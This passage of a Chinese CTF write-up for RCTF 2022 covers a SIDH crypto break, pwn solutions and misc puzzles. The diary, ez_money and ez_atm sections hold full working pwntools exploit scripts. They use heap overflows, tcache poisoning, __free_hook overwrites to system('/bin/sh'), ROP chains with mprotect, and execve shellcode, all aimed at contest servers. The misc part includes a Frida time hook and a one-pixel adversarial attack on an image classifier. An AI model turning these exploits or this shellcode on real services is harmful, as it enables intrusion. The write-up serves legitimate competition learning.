sage: R.<x> = PolynomialRing(Fp2)
sage: E_start = EllipticCurve(Fp2, [1,0])
sage: E_start.set_order((p+1)^2) # Speeds things up in Sage
sage: EA=EllipticCurve(Fp2,[4926878008530427712778566*i+805308378870980843649036
....: 0,18771446501040649196825847*i+16306438728950797793375410])
sage: PA=EA(2535790352220803985875373*i + 17699033710915047849396921,24135582497
....: 12558899689063*i + 5157954648088691506046995)
sage: QA=EA(16568070039544280994803013*i + 21423138055383385576701886,5040448698
....: 696125071219900*i + 6672798507142407841550817)
sage: c=173356622539
sage: enc=243706092945144760206191226817331300960683091878992
sage: J=EA.isogeny(PA+c*QA,algorithm='factored').codomain().j_invariant()
sage: b"RCTF{"+long_to_bytes(enc^^((int(J[1]) << 84) + int(J[0])))+b'}'
b'RCTF{SIDH_isBr0ken_in_2O22}'
sage: 
```

## magic_sign（赛后）

第一眼看见以为是抽代的什么东西，毕竟要素齐全：经典的H,K可交换，正规子群。。。

然后看了下逻辑，尝试逆向乘法失败。。。

结束才知道是根据论文出的

复现论文： https://eprint.iacr.org/2021/444 ， https://eprint.iacr.org/2021/487 

攻击方式也很简单（好像不需要看论文也能写），利用的是generator影响的位置有限这一性质去搜索误差调整。。。

## clearlove（待复现）

时间不够没怎么来得及调，参考2022虎符CTF：[my_ctf_challenge/exp.py at main · 1umi3re/my_ctf_challenge](https://github.com/1umi3re/my_ctf_challenge/blob/main/hfctf_2022/RRSSAA/exp.py)

## Derek（待复现）

时间不够看都没看。。。

# PWN

## diary 

各部分的大致功能：

add：最多写入32条日记，时间在2022.12.31 23:59:59前有效；分配0x300的空间，content最多写入0x2F0。

update：正常的修改content，不过好像即使idx大于日记范围了，也会去修改内容？

show：正常的输出时间和内容

delete：

encrypt：

decrypt：

利用urandom  enc加密fd到free_hook

```Apache
# _*_ coding:utf-8 _*_
from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal=['tmux', 'splitw', '-h']
prog = './diary'
debug_ = 0
if debug_ == 1:
        p = process(prog)#,env={"LD_PRELOAD":"./libc-2.27.so"})
        libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
else:
        p = remote("119.13.105.35",10111)
        libc = ELF("./libc-2.31.so")
def debug(addr,PIE=True): 
        debug_str = ""
        if debug_ == 0:
                return 0
        if PIE:
                text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16) 
                for i in addr:
                        debug_str+='b *{}\n'.format(hex(text_base+i))
                gdb.attach(p,debug_str) 
        else:
                for i in addr:
                        debug_str+='b *{}\n'.format(hex(i))
                gdb.attach(p,debug_str) 

def dbg():
        gdb.attach(p)
#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))        #in case that data is an int
sa      = lambda delim,data         :p.sendafter(str(delim), str(data)) 
sl      = lambda data               :p.sendline(str(data)) 
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data)) 
r       = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
it      = lambda                    :p.interactive()
uu32    = lambda data   :u32(data.ljust(4, '\0'))
uu64    = lambda data   :u64(data.ljust(8, '\0'))
bp      = lambda bkp                :pdbg.bp(bkp)
li      = lambda str1,data1         :log.success(str1+'========>'+hex(data1))
lbc = lambda :p.recvuntil('\x7f')[-6:].ljust(8, '\x00')
        
def dbgc(addr):
        gdb.attach(p,"b*" + hex(addr) +"\n c")

def lg(s,addr):
    print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))

sh_x86_18="\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
sh_x86_20="\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
sh_x64_21="\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"
#https://www.exploit-db.com/shellcodes
#-----------------------------------------------------------------------------------------
def add(content, year=2022, month = 1, day = 2, hour = 3, minutes = 4, second = 5):
    pay = 'add#' + str(year) + '#' + str(month) + '#' + str(day) + '#' + str(hour) + '#' + str(minutes) + '#' + str(second) + '#' + content
    sla('test cmd:', pay)

def update(idx,content):
    pay = 'update#' + str(idx) + '#' + content
    sla('test cmd:', pay)

def delete(idx):
    pay = 'delete#' + str(idx)
    sla('test cmd:', pay)

def show(idx):
    pay = 'show#' + str(idx)
    sla('test cmd:', pay)

def encrypt(idx, off ,length):
    pay = 'encrypt#' + str(idx) + '#' + str(off) + '#' + str(length)
    sla('test cmd:', pay)

def decrypt(idx):
    pay = 'decrypt#' + str(idx)
    sla('test cmd:', pay)
def exp():
        for i in range(10):
            add('aaaa'+str(i) + 'c'*0x250, 2011+i,1,2,3,4,5)
        for i in range(7):
            delete(9-i)
        #encrypt(0,0,4)
        #
        delete(0)
        show(1)
        ru('\x35\x0a')
        libc_base = uu64(r(6))-0x1ecbe0
        lg('libc_base',libc_base)
        for i in range(12):
            add('aaaa'+str(i) + 'c'*0x250, 1900+i,1,2,3,4,5)
        # debug([0x3839])
        fh = libc.sym["__free_hook"]+libc_base-0x10 #fh-0x10
        fh_one = (fh&0xff)^0x20^0x63
        fh_two = ((fh&0xff00)>>8)^0x20^0x63
        fh_thr = ((fh&0xff0000)>>16)^0x20^0x63
        fh_fou = ((fh&0xff000000)>>24)^0x20^0x63
        fh_fiv = ((fh&0xff00000000)>>32)^0x20^0x63
        fh_six = ((fh&0xff0000000000)>>40)^0x20^0x63
        fh_sev = fh_eig = 0^0x20

        lg('fh_one',fh_one)
        lg('fh_one',fh_two)
        lg('fh_one',fh_thr)
        lg('fh_one',fh_fou)
        lg('fh_one',fh_fiv)
        lg('fh_one',fh_six)
        
# ru('\x7f')[-6:]

        encrypt(0,0,0x200)
        show(0)
        ru("\x35")
        r(1)
        data = ru('input')
        # random10 = r(0x200)
        # lg('random10',random10)
        # # encrypt(2,0,0x1f0)
        delete(1)
        pay='\x20'*4
        update(12,pay)
        delete(0)
        pay='\x20'*2+'\x00'*2
        # debug([0x41b8,0x36EB,0x04337])

        update(11,pay)
        # print data[0]
        # print type(data[0])
        # print p8(fh_one)
        idx1 = data.index(p8(fh_one))
        idx2 = data.index(p8(fh_two))
        idx3 = data.index(p8(fh_thr))
        idx4 = data.index(p8(fh_fou))
        idx5 = data.index(p8(fh_fiv))
        idx6 = data.index(p8(fh_six))


        print idx1,idx2,idx3,idx4,idx5,idx6
        print data[idx1]
        print data[idx2]
        print data[idx3]
        print data[idx4]
        print data[idx5]
        print data[idx6]

        encrypt(0,0,idx1)
        encrypt(11,0,1)
        encrypt(0,0,0x200-idx1-1)


        encrypt(3,0,idx2)        
        encrypt(11,1,1)
        encrypt(3,0,0x200-idx2-1)

        # debug([0x388e])
        encrypt(4,0,idx3)        
        encrypt(11,2,1)
        encrypt(4,0,0x200-idx3-1)


        encrypt(6,0,idx4)        
        encrypt(11,3,1)
        encrypt(6,0,0x200-idx4-1)


        encrypt(7,0,idx5)        
        encrypt(11,4,1)
        encrypt(7,0,0x200-idx5-1)


        encrypt(8,0,idx6)        
        encrypt(11,5,1)
        encrypt(8,0,0x200-idx6-1)
        system = libc_base+libc.sym['system']
        og = libc_base+0xe3afe
        pay1=p64(system)
        add(';sh\x00', 1913,1,2,3,4,5)
        lg('og',og)
        # dbg()
        add(';/bin/sh;aaa' + pay1, 1914 ,1,2,3,4,5)
        
        # dbg()
        lg('fh',fh)
        it()
if __name__ == '__main__':
        exp()


#         0xe3afe execve("/bin/sh", r15, r12)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [r12] == NULL || r12 == NULL

# 0xe3b01 execve("/bin/sh", r15, rdx)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [rdx] == NULL || rdx == NULL

# 0xe3b04 execve("/bin/sh", rsi, rdx)
# constraints:
#   [rsi] == NULL || rsi == NULL
#   [rdx] == NULL || rdx == NULL

# 0xe3cf3 execve("/bin/sh", r10, r12)
# constraints:
#   address rbp-0x78 is writable
#   [r10] == NULL || r10 == NULL
#   [r12] == NULL || r12 == NULL

# 0xe3cf6 execve("/bin/sh", r10, rdx)
# constraints:
#   address rbp-0x78 is writable
#   [r10] == NULL || r10 == NULL
#   [rdx] == NULL || rdx == NULL
```





## ez_money 

在 loan_money 处存在堆溢出，第 11 个贷款能够溢出第 1 个 account 的 size，改成 largebin 之后利用 vip 查看贷款的功能可以泄漏出 libc 和 heap 地址，改 free_hook 为 system 即可。

```Python
#! /usr/bin/env python3
# -*- coding: utf-8 -*-
from PwnContext import *

context.terminal = ['tmux', 'splitw', '-h', '-p70']
#-----function for quick script-----#
s       = lambda data               :ctx.send(data)        
sa      = lambda delim,data         :ctx.sendafter(delim, data) 
sl      = lambda data               :ctx.sendline(data) 
sla     = lambda delim,data         :ctx.sendlineafter(delim, data)
r       = lambda numb=4096          :ctx.recv(numb)
ru      = lambda delims, drop=True  :ctx.recvuntil(delims, drop)
rs      = lambda *args, **kwargs    :ctx.start(*args, **kwargs)
irt     = lambda                    :ctx.interactive()

lg                 = lambda s                                        :log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
uu32    = lambda data                           :u32(data.ljust(4, b'\0'))
uu64    = lambda data                           :u64(data.ljust(8, b'\0'))
getLeak = lambda                                        :uu64(ru(b'\x7f',drop=False)[-6:])

debugg = 0
logg = 0

ctx.binary = './ez_money'

ctx.custom_lib_dir = './glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/'#remote libc
ctx.debug_remote_libc = True

ctx.symbols = {'note':0x6060}
#ctx.breakpoints = [0x1234]
#ctx.debug()

if debugg:
        rs()
        #rs("gdb",gdbscript="set follow-fork-mode child\ncode\nb *$code+0x1ea4")
else:
        ctx.remote = ('110.238.108.112', 5200)
        rs(method = 'remote')

if logg:
        context.log_level = 'debug'

def new(aid,apass,amoney):
        sla(b'choice',b'new_account')
        sla(b'account id',aid)
        sla(b'password',apass)
        sla(b'money',str(amoney).encode())

def update_pwd(ori_pwd,new_pwd):
        sla(b'choice',b'Update_info')
        sla(b'new password',new_pwd)
        sla(b'password',ori_pwd)

def cancellation(passwd):
        sla(b'choice',b'Cancellation')
        sla(b'password',passwd)

def loan_money(amount,comment):
        sla(b'choice',b'Loan_money')
        sla(b'loan amount',str(amount).encode())
        sla(b'comments',comment)

def repayment(paycnt):
        sla(b'choice',b'Loan_money')
        sla(b'repay?',str(paycnt).encode())

def login(aid,apass):
        sla(b'choice',b'login')
        sla(b'account id',aid)
        sla(b'password',apass)

def vip():
        sla(b'choice',b"I'm vip!")

def exit_account():
        sla(b'choice',b'Exit_account')

for i in range(15):
        if i == 0xd:
                new(p64(0x21)+p64(0xd)*3,p64(0),0x21)
        else:
                new(p64(i*i)*4,p64(i*i),0x11223344)
        exit_account()

for i in range(10):
        login(p64(i*i)*4,p64(i*i))
        loan_money(0x11,b'a'*0x20)
        exit_account()

login(p64(10*10)*4,p64(10*10))
update_pwd(p64(10*10),p64(10*10)+p64(0)+p64(0x421))
loan_money(0x11,b'a'*0x20)
exit_account()

login(p64(10*10)+b'a'*0x18,p64(0))
cancellation(p64(10*10))

login(p64(1*1)*4,p64(1*1))
vip()
libc_base = getLeak() - 0x1ecbe0
lg('libc_base')
libc = ELF(ctx.custom_lib_dir+'libc.so.6',checksec=False)
free_hook = libc_base + libc.sym['__free_hook']
system = libc_base + libc.sym['system']

exit_account()
new(p64(15*15)*4,p64(15*15),0x11223344)
exit_account()
new(p64(16*16)*4,p64(16*16),0x11223344)
exit_account()

login(p64(15*15)*4,p64(15*15))
cancellation(p64(15*15))
login(p64(16*16)*4,p64(16*16))
cancellation(p64(16*16))

login(p64(12*12)*4,p64(12*12))
vip()
heap = uu64(ru(b'\x55',drop=False)[-6:])
lg('heap')
exit_account()

login(p64(heap)+p64(16*16)*3,p64(heap+0x570))
update_pwd(p64(heap+0x570),p64(free_hook-0x10)+p64(heap))
exit_account()

new(p64(17*17)*4,p64(17*17),0x11223344)
exit_account()
new(p64(0)+p64(system),b'/bin/sh\x00',0x11223344)
cancellation(b'/bin/sh\x00')

#ctx.debug()
irt()
```

## ez_atm 

server程序在cancellation功能中存在泄漏，client程序在query返回结果中可以溢出泄漏当前堆块之后的数据，patch一下即可，如下图，balance改成 %s 打印，然后改一下偏移到下一个堆块的 bk。

![img](https://blu3moon.oss-cn-hangzhou.aliyuncs.com/img/202212130820379.png)

因此 uaf 首先泄漏堆地址，然后攻击 tcache 结构体，造成任意地址分配，先分配到堆上修改其中一个堆块的 size 为 largetbin 的范围，然后用同样的 query 方法泄漏出 libc 地址。

接着因为题目是 socket 发送接收，需要 stack pivot + mprotect + orw 来将 flag 读到内存后再发送回来即可。

```Python
#! /usr/bin/env python3
# -*- coding: utf-8 -*-
from PwnContext import *

context.terminal = ['tmux', 'splitw', '-h', '-p70']
#-----function for quick script-----#
s       = lambda data               :ctx.send(data)        
sa      = lambda delim,data         :ctx.sendafter(delim, data) 
sl      = lambda data               :ctx.sendline(data) 
sla     = lambda delim,data         :ctx.sendlineafter(delim, data)
r       = lambda numb=4096          :ctx.recv(numb)
ru      = lambda delims, drop=True  :ctx.recvuntil(delims, drop)
rs      = lambda *args, **kwargs    :ctx.start(*args, **kwargs)
irt     = lambda                    :ctx.interactive()

lg                 = lambda s                                        :log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
uu32    = lambda data                           :u32(data.ljust(4, b'\0'))
uu64    = lambda data                           :u64(data.ljust(8, b'\0'))
getLeak = lambda                                        :uu64(ru(b'\x7f',drop=False)[-6:])

logg = 0

#ctx.custom_lib_dir = './glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/'#remote libc
#ctx.debug_remote_libc = True

#ctx.symbols = {'note':0x1234}
#ctx.breakpoints = [0x13cb]
#ctx.debug()

if logg:
        context.log_level = 'debug'

def query():
        sla(b'choice',b'query')

def login(aid,apass):
        sla(b'choice',b'login')
        sla(b'account id',aid.ljust(0x20,b'\x00'))
        sla(b'password',apass.ljust(8,b'\x00'))

def new(aid,apass):
        sla(b'choice',b'new_account')
        sla(b'account id',aid.ljust(0x20,b'\x00'))
        sla(b'password',apass.ljust(8,b'\x00'))
        sla(b'money',b'0')

def update_pwd(new_pwd,ori_pwd):
        sla(b'choice',b'update_pwd')
        sla(b'new password',new_pwd.ljust(8,b'\x00'))
        sla(b'pasword',ori_pwd.ljust(8,b'\x00'))

def cancellation(passwd):
        sla(b'choice',b'cancellation')
        sla(b'password',passwd.ljust(8,b'\x00'))

def exit_account():
        sla(b'choice',b'exit_account')

def vip():
        sla(b'choice',b"I'm vip!")

ctx.binary = './client'
        
debugg = 0

if debugg:
        ctx = process(argv=['./client','127.0.0.1','3339'])
        #ctx = process(argv=['./client','192.168.98.1','4445'])
else:
        ctx = process(argv=['./client','190.92.237.200','4445'])

new(b'id:000',b'000')
exit_account()
new(b'id:111',b'111')
exit_account()

new(b'id:222',b'222')
cancellation(b'222')

login(b'id:111',b'111')
cancellation(b'111')

login(b'id:000',b'000')
query()
ru(b'balance:  ')
heap = uu64(ru(b'\n')) - 0x10
lg('heap')
exit_account()

#login(p64(heap+0x10)[:6],p64(heap+0x6f0+0xc00)[:6])
#ru(b'\n')
#data = ru(b'\n')
#if b'error' not in data:
#        print(data)
#        irt()
#else:
#        ctx.close()
if not debugg:
        offset = 0xc00
else:
        offset = 0

login(p64(heap+0x10),p64(heap+0x6f0+offset))
update_pwd(p64(heap+0x60),p64(heap+0x6f0+offset))
exit_account()

new(b'dsadsa',b'AAA')
exit_account()
new(b'evil',p64(heap+0x6a0+offset))
exit_account()
new(p64(0x421),p32(0))
exit_account()

login(b'evil',p32(0))
update_pwd(p64(heap+0xac8+offset),p32(0))
exit_account()

new(p64(0)*3+p32(0x21),p64(0x21))
exit_account()

login(p64(0)*2+p64(0x0000000100000000),p8(0))
cancellation(p8(0))

login(b'id:000',b'000')
query()
libc_base = getLeak() - 0x3ebca0
lg('libc_base')

libc = ELF('./glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/libc.so.6')
free_hook = libc_base + libc.sym['__free_hook']
system = libc_base + libc.sym['system']
mprotect = libc_base + libc.sym['mprotect']
openn = libc_base + libc.sym['open']
readd = libc_base + libc.sym['read']
setcontext = libc_base + libc.sym['setcontext']

pop_rdi = libc_base + 0x000000000002164f
pop_rsi = libc_base + 0x0000000000023a6a
pop_rdx = libc_base + 0x0000000000001b96
add_rsp_0x28 = libc_base + 0x000000000003e212
add_rsp_0x38 = libc_base + 0x00000000000e0b2d
pop_4 = libc_base + 0x0000000000021648 
pop_3 = libc_base + 0x0000000000023a65
pop_2 = libc_base + 0x0000000000021b33
pop_r8 = libc_base + 0x0000000000155e26
leave_ret = libc_base + 0x00000000000547e3
magic = libc_base + 0x15b066 # svcudp_reply+22

cancellation(b'000')
id_00 = p64(0)+p64(add_rsp_0x38)+p64(0)+p64(heap+0x670+offset-0x28)
new(id_00,p64(leave_ret))
exit_account()
new(p64(heap+0x678+offset)+p64(pop_rdi)+p64(heap)+p64(pop_3),p64(0))
exit_account()
new(p64(0x3000)+p64(pop_rdx)+p64(7)+p64(pop_3),p64(pop_rsi))
exit_account()

shellcode = asm('mov r9,0x%x;add r9,0x%x;jmp r9'%(heap,0x770+offset))
print(hex(len(shellcode)))
assert len(shellcode) <= 0x18
new(p64(heap+0x740+offset)+shellcode.ljust(0x18,b'\x00'),p64(mprotect))
exit_account()

shellcode = asm(shellcraft.amd64.open('flag'))+asm('mov rdi,rax;xor eax,eax;push 0x50;pop rdx')
shellcode += asm('add r9,0x40;jmp r9')
print(hex(len(shellcode)))
assert len(shellcode) <= 0x28
new(shellcode[8:].ljust(0x20,b'\x00'),shellcode[:8])
exit_account()

shellcode = asm('mov rsi,0x%x;syscall;push 4;pop rdi;xor edx,edx;xor ecx,ecx;xor r8d,r8d;xor r9d,r9d;mov dl,0x84;push 0x2c;pop rax;syscall'%(heap+0x1000))
print(hex(len(shellcode)))
assert len(shellcode) <= 0x28
new(shellcode[8:].ljust(0x20,b'\x00'),shellcode[:8])
exit_account()

login(b'evil',p32(0))
update_pwd(p64(free_hook),p32(0))
exit_account()

new(b"",p64(magic))
exit_account()

login(id_00,p64(leave_ret))

input("trigger...")
cancellation(p64(leave_ret))

irt()
```



## game

umount权限没有设置

直接传一个system程序 非预期

# Misc

## Checkin

![img](https://blu3moon.oss-cn-hangzhou.aliyuncs.com/img/202212130820460.png)



## ez_alient 

alien.bmp文件尾隐藏内容base64解密得压缩包密码，解压PE文件加exe后缀可运行，进入了pygame经典打飞机游戏，看项目没有通关条件

根据提示，new topic descrption！可以知道顶端描述如下

![img](https://blu3moon.oss-cn-hangzhou.aliyuncs.com/img/202212130820559.png)

使用的python3.8版本进行的打包，所以我们进行反编译时，要在python3.8的环境下进行，这样它的库文件pyc才能够被反编译出来

反编译结果如下

一个主pyc

![img](https://blu3moon.oss-cn-hangzhou.aliyuncs.com/img/202212130820773.png)

反编译成py后，可得知其有以下库文件

![img](https://blu3moon.oss-cn-hangzhou.aliyuncs.com/img/202212130820994.png)

并且我们在它的最底部发现了一个字符串

![img](https://blu3moon.oss-cn-hangzhou.aliyuncs.com/img/202212130820147.png)

只有一小段，于是我们干脆就把所有库文件反编译出来

![img](https://blu3moon.oss-cn-hangzhou.aliyuncs.com/img/202212130820494.png)

![img](https://blu3moon.oss-cn-hangzhou.aliyuncs.com/img/202212130820631.png)

发现库文件里都出现了base64编码过后的字符，猜测这就是flag

于是全部提取

```Plain%20Text
s = b'VTJreE0yNWpNdz09'
a = b'YmtWMlJYST0='
a = b'TVRVPQ=='
k = b'T1dsMmFXNDU='
t = b'ZFhBPQ=='
m = b'SmlZPQ=='
l = b'Tm5WMA=='
m = b'YURBeFpHbHVPUT09   VDI0PQ==    VTJreE0yNVVNWGs9'

base64解密后
 s = Si13nc3
a = nEvEr
a = 15
k = 9ivin9
t = up
m = &&
l = 6ut
m = h01din9   On    Si13nT1y

按照语法拼出来
Flag : RCTF{Si13nc3_15_nEvEr_9ivin9_up_&&_6ut_h01din9_On_Si13nT1y} 
```

## ezPVZ

首先通过图片调用的字符串，找到相关关卡的附近函数

![img](https://blu3moon.oss-cn-hangzhou.aliyuncs.com/img/202212130820764.jpeg)

![img](https://blu3moon.oss-cn-hangzhou.aliyuncs.com/img/202212130820005.png)

**三个关卡分别用的类封装实现，这里是类中函数的地址表，其中每一关的函数有一部分是继承于父类前一关的**

**其中主要函数有init,card_init,logic,cardlogic,win**

init：这里含有**初始阳光**

![img](https://blu3moon.oss-cn-hangzhou.aliyuncs.com/img/202212130820914.png)

logic：循环一定时间里**执行逻辑，包括冷却，判赢逻辑**

![img](https://blu3moon.oss-cn-hangzhou.aliyuncs.com/img/202212130820700.png)

卡片逻辑：对每个植物判断，时间大于冷却时间且阳光大于需要阳光数，卡片就可以使用

![img](https://blu3moon.oss-cn-hangzhou.aliyuncs.com/img/202212130820731.png)

判赢逻辑：下面flag置为2即为游戏胜利进入下一关

![img](https://blu3moon.oss-cn-hangzhou.aliyuncs.com/img/202212130820036.png)

随便赢

## ez_hook

![img](https://blu3moon.oss-cn-hangzhou.aliyuncs.com/img/202212130820524.png)

hook currentTimeMillis 使它返回值小于一个过去时间. hook java 层去改实现失败后, 由 https://pzemtsov.github.io/2017/07/23/the-slow-currenttimemillis.html 得知 currentTimeMillis 由 native 层实现, 于是改成 hook native 即可

```JavaScript
setImmediate(() => {
    const currentTimeMillis = Module.findExportByName(
      "libjvm.so",
      "JVM_CurrentTimeMillis"
    );
    Interceptor.attach(currentTimeMillis, {
      onEnter: function(args) {},
      onLeave: function(retval) {
        retval.replace(1);
      }
    });
});
```

提交的时候用 burp 加个 ip 参数

![img](https://blu3moon.oss-cn-hangzhou.aliyuncs.com/img/202212130820633.png)

## K999

打开exe发现是一个很奇怪的游戏，玩不懂，010查看exe文件，发现末尾添加了压缩包数据

![img](https://blu3moon.oss-cn-hangzhou.aliyuncs.com/img/202212130820581.png)

提取出压缩包数据之后解压，得到非常多lua文件

![img](https://blu3moon.oss-cn-hangzhou.aliyuncs.com/img/202212130820236.png)



发现flag.lua文件是根据key跟密文解密flag的lua脚本

![img](https://blu3moon.oss-cn-hangzhou.aliyuncs.com/img/202212130820398.png)

在main.lua中发现flag1-flag6

![img](https://blu3moon.oss-cn-hangzhou.aliyuncs.com/img/202212130820518.png)

根据特征发现flag1是key，flag2-flag5是密文,在线运行解密得到flag

![img](https://blu3moon.oss-cn-hangzhou.aliyuncs.com/img/202212130820977.png)

## CatSpy

让ai识别上传的图片不再是cat或者tabby即可输出flag；但是要求上传的图片跟start.png只能有一个像素值不同

![img](https://blu3moon.oss-cn-hangzhou.aliyuncs.com/img/202212130820242.png)

![img](https://blu3moon.oss-cn-hangzhou.aliyuncs.com/img/202212130820354.png)

于是生成3600张将各个像素点的RGB值都改成较小的值打算看下哪个像素对识别影响最大

```Python
from PIL import  Image
img=Image.open('start.png')
for i in range(60):
    for j in range(60):
        r,g,b=img.getpixel((j, i))
        img.putpixel((j,i),(6,6,6))
        img.save('w'+str(j)+'h'+str(i)+'.png')
        img.putpixel((j,i),(r,g,b))
```

自动化上传

```Python
from urllib3 import encode_multipart_formdata
import requests
import os
import re

url = 'http://190.92.236.197:8888/upload'

def post_files(filename):
    with open(filename,'rb') as f:
        file = {
            "file" : ("filename", f.read())
        }
        encode_data = encode_multipart_formdata(file)
        file_data = encode_data[0]
        header = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
            'Content-Type' : encode_data[1]
        }
        res = requests.post(url, headers=header, data=file_data)
        print(res.text.split('\n')[13])
if __name__ == '__main__':
    for i in range(60):
        for j in range(60):
            print((j,i))
            filename='w'+str(j)+'h'+str(i)+'.png'
            post_files(filename)
```

发现在对(32,9）坐标值的像素点修改后直接满足了条件

![img](https://blu3moon.oss-cn-hangzhou.aliyuncs.com/img/202212130820485.png)

## feedback

![img](https://blu3moon.oss-cn-hangzhou.aliyuncs.com/img/202212130820040.png)